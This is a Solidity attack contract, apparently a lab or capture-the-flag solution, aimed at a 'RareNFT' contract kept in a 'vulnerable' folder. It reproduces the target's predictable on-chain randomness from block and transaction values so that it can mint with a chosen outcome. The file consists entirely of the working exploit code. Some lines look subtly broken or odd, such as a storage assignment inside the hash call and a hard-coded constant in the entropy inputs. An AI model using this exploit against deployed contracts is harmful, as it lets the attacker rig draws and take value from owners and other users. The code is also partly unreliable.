//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "../vulnerable/RareNFT.sol";

contract RareNFTAttack {
    uint256 public nonce;
    bytes public gas;
    RareNFT claim= RareNFT(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    constructor() payable{
        require(msg.value >= 1 ether, "RareNFT: requires 1 ether");
}

    function _randGenerator(uint256 _drawNum) internal returns (uint256) {
        require(_drawNum > 0, "RareNFT: drawNum must be greater than 0");

        bytes32 randHash = keccak256(
            gas=abi.encodePacked(
                blockhash(block.number - 1),
                block.timestamp,
                block.coinbase, uint256(0x0000000000000000000000000000000000000000000000000000000001af08b9),
                tx.gasprice,
                tx.origin,
                nonce,
                address(this)
            )
        );

        uint256 random = uint256(randHash) % _drawNum;
        nonce++;
        return random;
    }
    function attack(uint256 _nonce,uint256 _luckyVal) public{
        nonce=_nonce;
        uint256 ranndomhash=_randGenerator(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        claim.mint{value:1 ether}(ranndomhash-_luckyVal);

    }


}
